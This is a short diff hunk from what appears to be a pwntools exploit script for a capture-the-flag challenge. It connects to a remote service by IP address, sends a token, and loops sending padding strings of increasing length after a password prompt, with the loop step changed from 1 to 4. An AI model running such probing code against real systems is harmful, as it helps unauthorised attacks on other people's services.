@@ -78,7 +78,7 @@ def exp1():
     io = remote('115.28.78.54', 13455)
     io.recvuntil('token:')
     io.sendline('b66888c818c08d932ea91b8d6a1f122c2y7ZAdbh')
-    for i in range(0,256):
+    for i in range(0,256,4):
         payload = 'a'*i
         io.recvuntil('WelCome my friend,Do you know password?')
         io.sendline(payload)
